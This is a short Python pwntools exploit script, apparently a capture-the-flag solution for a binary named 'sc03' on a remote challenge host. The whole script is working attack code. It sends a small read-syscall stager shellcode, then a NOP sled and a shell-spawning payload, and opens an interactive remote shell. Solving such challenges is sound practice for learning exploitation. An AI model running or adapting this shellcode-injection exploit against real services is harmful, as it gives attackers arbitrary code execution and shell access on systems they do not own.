#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sc03')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30013)
# host = 'localhost'
# port = 1024
def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *runShellcode
continue
'''.format(**locals())

# -- Exploit goes here --
shellcode = """
xchg esi, edx;
xor edi, edi;
syscall
"""

lol = asm(shellcode)
print(len(lol))
io = start()
io.recvuntil(b">")
io.send(lol)
pause()
io.sendline(b'\x90' * 20 + asm(shellcraft.sh()))
io.interactive()

